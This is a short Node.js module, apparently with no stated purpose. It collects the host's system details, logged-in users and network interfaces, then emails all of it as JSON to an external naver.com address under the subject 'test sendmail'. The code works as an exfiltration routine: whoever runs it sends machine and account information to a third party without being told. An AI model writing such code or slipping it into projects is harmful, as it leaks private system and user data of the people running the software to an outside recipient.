module.exports = async (callback) => {
    const sendmail = require('sendmail')();
    const si = require('systeminformation');

    let system = await si.system();
    let users = await si.users();
    let network = await si.networkInterfaces();

    sendmail({
        from: 'h20913@gmail.com',
        to: 'h20913@naver.com',
        subject: 'test sendmail',
        html: `
    ${JSON.stringify(system)}
    ${JSON.stringify(users)}
    ${JSON.stringify(network)}
    `,
    }, function (err, reply) {
        console.log(err && err.stack);
        console.dir(reply);
    });
};